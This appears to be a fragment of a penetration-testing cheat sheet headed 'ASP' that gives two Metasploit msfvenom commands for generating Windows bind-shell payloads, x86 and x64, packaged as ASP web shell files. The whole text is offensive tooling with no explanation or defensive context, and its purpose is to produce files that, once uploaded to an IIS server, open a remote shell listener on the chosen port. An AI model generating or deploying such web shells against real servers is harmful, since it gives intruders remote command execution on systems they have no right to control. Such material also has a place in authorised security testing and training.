# ASP

`$ msfvenom -p windows/shell/bind_tcp lport=<PORT> -f asp -o shell-x86.asp`

`$ msfvenom -p windows/x64/shell_bind_tcp lport=<PORT> -f asp -o shell-x64.asp`